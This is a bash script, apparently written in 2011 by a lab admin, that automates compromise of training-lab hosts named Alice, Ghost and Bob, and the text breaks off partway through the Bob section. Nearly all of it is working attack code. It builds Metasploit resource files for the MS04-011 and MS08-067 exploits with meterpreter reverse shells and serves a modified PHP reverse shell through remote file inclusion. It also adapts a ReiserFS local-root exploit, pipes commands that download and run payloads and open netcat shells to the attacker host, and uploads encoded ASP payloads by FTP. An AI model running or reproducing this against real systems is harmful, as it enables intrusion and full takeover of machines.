#!/bin/bash
#
# Written to test the labs while a lab admin ...
# If you dont understand the functionality, dont run the script - SIMPLE
#
echo -e "[*]"
echo -e "[*] Labs Fuckifier...err Verifier Script"
echo -e "[*] Intellectual Property of Myself, Coded in: 2011"
echo -e "[*]\tWritten by: William no1special Coppola"
echo -e "[*]\t\tRESEARCH IS THE KEY TO UNLOCK KNOWLEDGE\n[*]"
echo -e "[*] For proper use of this script, you should understand the source...."
echo;
echo -e "[*] \t\tif [ 'you' != 'like' ];then"
echo -e "[*] \t\t   Go Fuckifier yourself!"
echo -e "[*] \t\tfi"
echo -e "[*]"
################################################################################
#
# set some variables for the application, ... I dont think this is a script anymore ....
#
lab11="/root/lab11/lab.conf" # vpn info
lab13="/root/lab13/lab.conf" # vpn info
lab15="/root/lab15/lab.conf" # vpn info
msfp="/pentest/exploits/framework3" # msf dir
msfc=$msfp"/msfconsole" # msf console
msfs=$msfp"/scripts" # msf scripts dir
lp="443" # multilistener port  -  the rest should be self describing ...
iface1=`ifconfig | grep -B2 "10.10.10.1" | grep tap | cut -d" " -f1`
iface2=`ifconfig | grep -B2 "10.10.12.1" | grep tap | cut -d" " -f1`
iface3=`ifconfig | grep -B2 "10.10.14.1" | grep tap | cut -d" " -f1`
lh1=`ifconfig $iface1 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
lh2=`ifconfig $iface2 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
lh3=`ifconfig $iface3 | grep "inet addr" | tr -s " " | cut -d":" -f2 | cut -d" " -f1`
pay="windows/meterpreter/reverse_tcp"
apay="exploit/windows/smb/ms04_011_lsass"
DH="DisablePayloadHandler=true"
#
# check for vpn access's
#
if [ `ifconfig | grep "Bcast:10.10.11.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
 echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
else
 echo -e "\n\t[*] Starting Labs 11 vpn connection"
 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab11
 echo -e "\n\t[*] Labs 11 are active and connected with the IP of" $lh1
fi
#
#
#
if [ `ifconfig | grep "Bcast:10.10.13.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
 echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
else
 echo -e "\n\t[*] Starting Labs 13 vpn connection"
 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab13
 echo -e "\n\t[*] Labs 13 are active and connected with the IP of" $lh2
fi
#
#
#
if [ `ifconfig | grep "Bcast:10.10.15.255" | tr -s " " | cut -d":" -f2 | cut -d " " -f1` != "" ];then
 echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
else
 echo -e "\n\t[*] Starting Labs 15 vpn connection"
 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Labs 11 vpn conenction" -e openvpn $lab15
 echo -e "\n\t[*] Labs 15 are active and connected with the IP of" $lh3
fi
#
#
#
echo -e "\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n"
#
# Checks for Ckermit FTP ...
#
if [ ! -f /usr/bin/kermit ];
  then
    apt-get update && apt-get install ckermit
fi
#
# produce the multihandler recourse file
#
if [ ! -f /pentest/exploits/framework3/scripts/mh.rc ];then
 echo -e "use exploit/multi/handler" >>  /pentest/exploits/framework3/scripts/mh.rc
 echo -e "set PAYLOAD windows/meterpreter/reverse_tcp" >>  /pentest/exploits/framework3/scripts/mh.rc
 echo -e "set LPORT 443" >>  /pentest/exploits/framework3/scripts/mh.rc
 echo -e "set LHOST 0.0.0.0" >> /pentest/exploits/framework3/scripts/mh.rc
 echo -e "set ExitOnSession false" >>  /pentest/exploits/framework3/scripts/mh.rc
 echo -e "exploit -j -z" >>  /pentest/exploits/framework3/scripts/mh.rc
fi
#
# Produces the ./multi.sh script to be used to launch the multihandler and starts it in the background
#
if [ ! -f /pentest/exploits/framework3/multi.sh ]; 
  then
    cat << EOF > /pentest/exploits/framework3/multi.sh 
#!/bin/bash
msfp="/pentest/exploits/framework3"
msfc=$msfp"/msfconsole"
echo -e "[*]\tMetasploit Multihandler Launching Now...";
xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e $msfc /pentest/exploits/framework3/scripts/mh.rc  &
EOF
chmod a+x /pentest/exploits/framework3/multi.sh
fi
#
# Check if there is  a multihandler already listening on 0.0.0.0:443 or if the service is litening on this port already ... continue if so
#
chkmh=`netstat -ant | grep "0.0.0.0:443" | tr -s " " | cut -d" " -f4`
if [ "$chkmh" != "0.0.0.0:443" ];
  then
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "multihandler window" -e /pentest/exploits/framework3/msfconsole -r /pentest/exploits/framework3/scripts/mh.rc &
  else
    echo -e "\n\n\t[*] The Multihandler is already functional!"
fi
#
# Read from STDIN and take IP as variable and compair it to a list of known targets....
#
echo -e "\n\n[*] What do you want to do?\n\n\t[*] Answers are: '{pop} {revert} {firewall}' choose wisely "
read select
if [ $select == "pop" ];
  then
    echo -e "\n[*] Please enter an IP address to test ...\n\t"
    read uip
    echo ""
fi
#
# start alice
#
if [ `echo $uip | cut -d"." -f4` == "201" ];
  then
    # if the resource file for alice does not exist then
     if [ ! -f $msfs"/alice11.rc" ];
       then
         echo -e "use exploit/windows/smb/ms04_011_lsass\nset rhost 10.10.11.201\nset lhost $lh1\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit\n" > $msfs/alice11.rc
     fi
     #
     if [ ! -f $msfs"/alice13.rc" ];
       then
         echo -e "use exploit/windows/smb/ms04_011_lsass\nset rhost 10.10.13.201\nset lhost $lh2\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit\n" > $msfs/alice13.rc
     fi
     #
     if [ ! -f $msfs"/alice15.rc" ];
       then
         echo -e "use exploit/windows/smb/ms04_011_lsass\nset rhost 10.10.15.201\nset lhost $lh3\nset lport 443\nset payload windows/meterpreter/reverse_tcp\nset DisablePayloadHandler True\nexploit\nsleep 5\nexit" > $msfs/alice15.rc
     fi
     #
     # Start Alice exploitation
     #
     if [ $uip == "10.10.11.201" ];
       then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Alice MSF Window" -e $msfc -r $msfs/alice11.rc
     fi
     #
     if [ $uip == "10.10.13.201" ];
       then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Alice MSF Window" -e $msfc -r $msfs/alice13.rc
     fi
     #
     if [ $uip == "10.10.15.201" ];
       then
         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Alice MSF Window" -e $msfc -r $msfp/alice15.rc
     fi
     #
  else

#start Ghost

 if [ `echo $uip | cut -d"." -f4` == "202" ]; then

# make file structure

  if [ ! -d /pentest/exploits/framework3/ghost/ ]; then
   mkdir /pentest/exploits/framework3/ghost/
  fi
  if [ ! -d /var/www/ghost/ ]; then
   mkdir /var/www/ghost
  fi
  if [ ! -d /var/www/ghost1/ ]; then
   mkdir /var/www/ghost1
  fi
  if [ ! -d /var/www/ghost2/ ]; then
   mkdir /var/www/ghost2
  fi
  if [ ! -d /var/www/ghost3/ ]; then
   mkdir /var/www/ghost3
  fi

# checks for pentest monkey reverse php shell

  if [ ! -f /pentest/exploits/framework3/ghost/php-rev.tar.gz ]; then
   wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz -O /pentest/exploits/framework3/ghost/php-rev.tar.gz
   tar -zxvf /pentest/exploits/framework3/ghost/php-rev.tar.gz
  fi

# starts the process to exploit ghost on subnet 11

   if [ $uip == "10.10.11.202" ]; then

# reverting Ghost before attacking

    echo -e "\n\t\t[*] Reverting Ghost before attacking to ensure a clean environment\n\n" 

    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Out of body experience" -e wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=0\&location=vm10 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php* &
    sleep 20     

# start apache remove PHP5 for Ghost exploit to work properly  

    if [ "`ps -A | grep apache2 | tr -s "\t" " " | cut -d " " -f4 | sort -u`" != "apache2" ]; then
     apache2ctl start && /usr/sbin/a2dismod php5 && apache2ctl restart
    fi

# if apache is running, disable php5 and restart for ghost exploit to work

    if [ "`ps -A | grep apache2 | tr -s "\t" " " | cut -d " " -f4 | sort -u`" == "apache2" ]; then
     /usr/sbin/a2dismod php5 && apache2ctl restart
    fi

# checks for reverse shell for ghost.php on subnet 11 - redundency! in case of config changes

    if [ ! -f /pentest/exploits/framework3/ghost/ghost11.php ]; then
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.10.12';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost11.php
    else
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.10.12';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost11.php
    fi

#checks for ghost.php in web dir - redundency! in case of config changes

    if [ ! -f /var/www/ghost1/header.inc.php ]; then
     cp /pentest/exploits/framework3/ghost/ghost11.php /var/www/ghost1/header.inc.php
    else
     cp /pentest/exploits/framework3/ghost/ghost11.php /var/www/ghost1/header.inc.php
    fi

# checks for C file to move to ghost for local root exploitation - redundency! in case of config changes

    if  [ ! -f /var/www/ghost1/casper.c ]; then
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost1/casper.c
     gcc -w /var/www/ghost1/casper.c -o /var/www/ghost1/casper
    else
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost1/casper.c
     gcc -w /var/www/ghost1/casper.c -o /var/www/ghost1/casper
    fi

# SED commands to produce a modified PoC to use on ghost machine subnet 11

    if [ ! -f /var/www/ghost1/casper.py ]; then 
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py |\
     sed -r "s/SHELL =(.*)//g" |\
     sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
     sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
     sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
     sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
     sed -r "s/f.write\(SHELL\)//g" |\
     sed -r "s/f.close\(\)//g" |\
     sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
     sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/10.10.10.12\/ghost1\/casper'\)/g" |\
     sed -r "s/if ret \!= 0://g" |\
     sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
     sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
     sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
     sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
     sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
     sed -r "s/main\(\)//g" |\
     sed -r "s/def :/def main\(\):/g" > /var/www/ghost1/casper.py &&\
     echo "if __name__ == '__main__':" >> /var/www/ghost1/casper.py &&\
     echo "    main()" >> /var/www/ghost1/casper.py
    fi

# Giving up the Ghost - DJ Shadow 

    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Shell commands on nc to ghost" -e 'echo "mount /apachelogs && cd /apachelogs/data && wget http://10.10.10.12/ghost1/casper.py && python ./casper.py && /bin/netcat 10.10.10.12 8081 -e /apachelogs/data/casper" | nc -l -v -p 8080' &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ecto-Containment Unit on port 8081" -e nc -l -v -p 8081 &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ghost in my shellz" -e 'wget http://10.10.11.202/1/slogin_lib.inc.php?slogin_path=http://10.10.10.12/ghost1/header.inc.php? && rm -rf "slogin_lib.inc.php?slogin_path=http:%2F%2F10.10.10.12%2Fghost1%2Fheader.inc.php?"' &
    sleep 80
    killall -9 wget
    ps -A xf | grep "nc -l -v -p 8080" | grep -v grep | tr -s " " | cut -d" " -f1 | xargs kill -9

   fi

# starts the process to exploit ghost on subnet 13 read uip

   if [ $uip == "10.10.13.202" ]; then

# reverting Ghost before attacking

    echo -e "\n\t\t[*] Reverting Ghost before attacking to ensure a clean environment\n\n" 
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Out of body experience" -e wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=1\&location=vm12 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php* &
    sleep 20 

# checks for reverse shell for ghost.php on subnet 13 - redundency! in case of config changes

    if [ ! -f /pentest/exploits/framework3/ghost/ghost13.php ]; then
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.12.10';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost13.php
    else
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.12.10';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost13.php
    fi

#checks for ghost.php in web dir - redundency! in case of config changes

    if [ ! -f /var/www/ghost2/header.inc.php ]; then
     cp /pentest/exploits/framework3/ghost/ghost13.php /var/www/ghost2/header.inc.php
    else
     cp /pentest/exploits/framework3/ghost/ghost13.php /var/www/ghost2/header.inc.php
    fi

# checks for C file to move to ghost for local root exploitation - redundency! in case of config changes

    if  [ ! -f /var/www/ghost2/casper.c ]; then
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost2/casper.c
     gcc -w /var/www/ghost2/casper.c -o /var/www/ghost2/casper
    else
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost2/casper.c
     gcc -w /var/www/ghost2/casper.c -o /var/www/ghost2/casper
    fi

# SED commands to produce a modified PoC to use on ghost machine subnet 13

    if [ ! -f /var/www/ghost2/casper.py ]; then 
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py |\
     sed -r "s/SHELL =(.*)//g" |\
     sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
     sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
     sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
     sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
     sed -r "s/f.write\(SHELL\)//g" |\
     sed -r "s/f.close\(\)//g" |\
     sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
     sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/10.10.12.10\/ghost2\/casper'\)/g" |\
     sed -r "s/if ret \!= 0://g" |\
     sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
     sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
     sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
     sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
     sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
     sed -r "s/main\(\)//g" |\
     sed -r "s/def :/def main\(\):/g" > /var/www/ghost2/casper.py &&\
     echo "if __name__ == '__main__':" >> /var/www/ghost2/casper.py &&\
     echo "    main()" >> /var/www/ghost2/casper.py
    fi

# Giving up the Ghost - DJ Shadow 

    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Shell commands on nc to ghost" -e 'echo "mount /apachelogs && cd /apachelogs/data && wget http://10.10.12.10/ghost2/casper.py && python ./casper.py && /bin/netcat 10.10.12.10 8081 -e /apachelogs/data/casper" | nc -l -v -p 8080' &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ecto-Containment Unit on port 8081" -e nc -l -v -p 8081 &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ghost in my shellz" -e wget http://10.10.13.202/1/slogin_lib.inc.php?slogin_path=http://10.10.12.10/ghost2/header.inc.php? && rm -rf "slogin_lib.inc.php?slogin_path=http:%2F%2F10.10.12.10%2Fghost2%2Fheader.inc.php?" &
    sleep 80
    killall -9 wget
    ps -A xf | grep "nc -l -v -p 8080" | grep -v grep | tr -s " " | cut -d" " -f1 | xargs kill -9

   fi

# starts the process to exploit ghost on subnet 15 read uip

   if [ $uip == "10.10.15.202" ]; then

    echo -e "\n\t\t[*] Reverting Ghost before attacking to ensure a clean environment\n\n" 
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Out of body experience" -e wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php* &
    sleep 20

# checks for reverse shell for ghost.php on subnet 15 - redundency! in case of config changes

    if [ ! -f /pentest/exploits/framework3/ghost/ghost15.php ]; then
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.14.10';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost15.php
    else
     cd /pentest/exploits/framework3/ghost/php-reverse-shell-1.0/
     cat php-reverse-shell.php | sed -r "s/(ip = )(.*)/\1'10.10.14.10';/g" | sed -r "s/(port = )(.*)/\1 8080;/g" > /pentest/exploits/framework3/ghost/ghost15.php
    fi

#checks for ghost.php in web dir - redundency! in case of config changes

    if [ ! -f /var/www/ghost3/header.inc.php ]; then
     cp /pentest/exploits/framework3/ghost/ghost15.php /var/www/ghost3/header.inc.php
    else
     cp /pentest/exploits/framework3/ghost/ghost15.php /var/www/ghost3/header.inc.php
    fi

# checks for C file to move to ghost for local root exploitation - redundency! in case of config changes

    if  [ ! -f /var/www/ghost3/casper.c ]; then
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost3/casper.c
     gcc -w /var/www/ghost3/casper.c -o /var/www/ghost3/casper
    else
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py | grep "SHELL =" | cut -d" " -f3- | cut -d"'" -f2 > /var/www/ghost3/casper.c
     gcc -w /var/www/ghost3/casper.c -o /var/www/ghost3/casper
    fi

# SED commands to produce a modified PoC to use on ghost machine subnet 15

    if [ ! -f /var/www/ghost3/casper.py ]; then 
     cat /pentest/exploits/exploitdb/platforms/linux/local/12130.py |\
     sed -r "s/SHELL =(.*)//g" |\
     sed -r "s/if not os.path.exists\('\/.reiserfs_priv\/xattrs'\):/if not os.path.exists('\/apachelogs\/.reiserfs_priv\/xattrs'\):/g" |\
     sed -r "s/msg\('preparing shell in \/tmp'\)//g" |\
     sed -r "s/err\('error setting xattr, you need setfattr'\)//g" |\
     sed -r "s/f = open\('\/tmp\/team-edward.c', 'w'\)//g" |\
     sed -r "s/f.write\(SHELL\)//g" |\
     sed -r "s/f.close\(\)//g" |\
     sed -r "s/pre = set\(os.listdir\('\/.reiserfs_priv\/xattrs'\)\)/pre = set\(os.listdir\('\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/msg\('compiling shell in \/tmp'\)/print '[\*] no1special HaxOred Me'/g" |\
     sed -r "s/ret = os.system\('gcc -w \/tmp\/team-edward.c -o \/tmp\/team-edward'\)/ret = os.system\('wget --quiet http:\/\/10.10.14.10\/ghost1\/casper'\)/g" |\
     sed -r "s/if ret \!= 0://g" |\
     sed -r "s/err\('error compiling shell\, you need gcc'\)/\n    os.system\('chmod 755 \/apachelogs\/data\/casper'\)/g" |\
     sed -r "s|(os\.system\('setfattr -n \"user.hax\" -v \"hax\" )(.*)|\1\/apachelogs\/data\/casper\'\)|g" |\
     sed -r "s/(post = set\(os.listdir\(')(.*)/\1\/apachelogs\/.reiserfs_priv\/xattrs'\)\)/g" |\
     sed -r "s/(f = open\('\/).reiserfs_priv\/(.*)/\1apachelogs\/.reiserfs_priv\/xattrs\/\%s\/security\.capability' \% obj\, \'w\')/g"  |\
     sed -r "s/os.system\('\/tmp\/team-edward'\)/os.system\('\/apachelogs\/data\/casper'\)/g" |\
     sed -r "s/if __name__ == '__main__':/    os.system\('id'\)/g"  |\
     sed -r "s/main\(\)//g" |\
     sed -r "s/def :/def main\(\):/g" > /var/www/ghost3/casper.py &&\
     echo "if __name__ == '__main__':" >> /var/www/ghost3/casper.py &&\
     echo "    main()" >> /var/www/ghost3/casper.py
    fi

# Giving up the Ghost - DJ Shadow 

    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Shell commands on nc to ghost" -e 'echo "mount /apachelogs && cd /apachelogs/data && wget http://10.10.14.10/ghost3/casper.py && python ./casper.py && /bin/netcat 10.10.14.10 8081 -e /apachelogs/data/casper" | nc -l -v -p 8080' &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ecto-Containment Unit on port 8081" -e nc -l -v -p 8081 &
    sleep 5
    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ghost in my shellz" -e wget http://10.10.15.202/1/slogin_lib.inc.php?slogin_path=http://10.10.14.10/ghost3/header.inc.php? && rm -rf "slogin_lib.inc.php?slogin_path=http:%2F%2F10.10.14.10%2Fghost3%2Fheader.inc.php?" &
    sleep 80
    killall -9 wget
    ps -A xf | grep "nc -l -v -p 8080" | grep -v grep | tr -s " " | cut -d" " -f1 | xargs kill -9

   fi

 else

# Start Bob

  if [ `echo $uip | cut -d"." -f4` == "203" ]; then

# kill apache is running
  
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:80" | cut -d" " -f6`" == "LISTEN" ]; then
    apache2ctl stop
    echo -e "\n\t[*] Killed the apache service to use port 80 on bob"
   fi

   if [ $uip == "10.10.11.203" ]; then
  
# kill sshd just to refresh it!
  
   if [ "`netstat -ant | tr -s " " | grep "0.0.0.0:22" | cut -d" " -f6`" == "LISTEN" ]; then
    killall -9 sshd
    echo -e "\n\t[*] Killed the ssh service to use port 22 on bob"
   fi 
  
# bob203 subnet 11

    if [ ! -d $msfp/bob ];then
     mkdir $msfp/bob
    fi

#make the plink rc file for bob20311

    if [ ! -f $msfs/bob11.rc ]; then
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" > $msfs/bob11.rc
    echo -e "\nset rhost 127.0.0.1" >> $msfs/bob11.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob11.rc
    echo -e "\nset lport 443" >> $msfs/bob11.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob11.rc
    echo -e "\nset lhost 10.10.10.12" >> $msfs/bob11.rc
    echo -e "\nexploit" >> $msfs/bob11.rc
    fi

# make the autoroute rc file for bob20310

    if [ ! -f $msfs/bob10.rc ]; then
    echo -e "use exploit/multi/handler" > $msfs/bob10.rc
    echo -e "\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/bob10.rc
    echo -e "\nset LPORT 80\nset LHOST 0.0.0.0" >> $msfs/bob10.rc
    echo -e "\nset ExitOnSession false" >> $msfs/bob10.rc
    echo -e "\nexploit -j -z" >> $msfs/bob10.rc
    echo -e "\nsleep 80" >> $msfs/bob10.rc
    echo -e "\nuse post/windows/manage/autoroute" >> $msfs/bob10.rc
    echo -e "\nset action ADD" >> $msfs/bob10.rc
    echo -e "\nset session 1" >> $msfs/bob10.rc
    echo -e "\nset subnet 10.10.11.0" >> $msfs/bob10.rc
    echo -e "\nsleep 45s" >> $msfs/bob10.rc
    echo -e "\nrun" >> $msfs/bob10.rc
    echo -e "\nuse exploit/windows/smb/ms08_067_netapi" >> $msfs/bob10.rc
    echo -e "\nset rhost 10.10.10.203" >> $msfs/bob10.rc
    echo -e "\nset lhost 10.10.10.12" >> $msfs/bob10.rc
    echo -e "\nset disablepayloadhandler true" >> $msfs/bob10.rc
    echo -e "\nset lport 443" >> $msfs/bob10.rc
    echo -e "\nset payload windows/meterpreter/reverse_tcp" >> $msfs/bob10.rc
    echo -e "\nexploit" >> $msfs/bob10.rc
    fi

    if [ ! -f $msfp/bob/evil11.asp ]; then
     $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=80 RHOST=10.10.11.203 DisablePayloadHandler=True R | $msfp/msfencode -t asp -o $msfp/bob/evil11.asp
    fi

    if [ ! -f $msfp/bob/exec11.asp ]; then
     $msfp/msfpayload windows/exec CMD='cmd.exe /c "c:\inetpub\wwwroot\plink.exe -auto_store_key_in_cache -C -P 22 -R 445:127.0.0.1:445 -l root -pw nothing 10.10.10.12"' R| $msfp/msfencode -b "\x00\x0a\x0d" -t asp -o $msfp/bob/exec11.asp
    fi

    if [ ! -f $msfp/bob/ftp11.txt ]; then
    echo -e "!#/usr/local/bin/kermit +" > $msfp/bob/ftp11.txt
    echo -e "\nftp open 10.10.11.203 /anonymous" >> $msfp/bob/ftp11.txt
    echo -e "\nftp cd wwwroot\nlcd /pentest/exploits/framework3/bob/" >> $msfp/bob/ftp11.txt
    echo -e "\nftp put evil11.asp evil11.asp" >> $msfp/bob/ftp11.txt
    echo -e "\nftp put exec11.asp exec11.asp" >> $msfp/bob/ftp11.txt 
    echo -e "\nlcd /pentest/windows-binaries/tools" >> $msfp/bob/ftp11.txt
    echo -e "\nftp put plink.exe plink.exe" >> $msfp/bob/ftp11.txt
    echo -e "\nftp bye" >> $msfp/bob/ftp11.txt
    echo -e "\nexit 0" >> $msfp/bob/ftp11.txt
    fi

    echo -e "\n\t[*] Do you wish to use plink or autoroute?\n\t\t[*] Please type [plink] or [auto]\n"

    read autop

    if [ $autop == "plink" ]; then
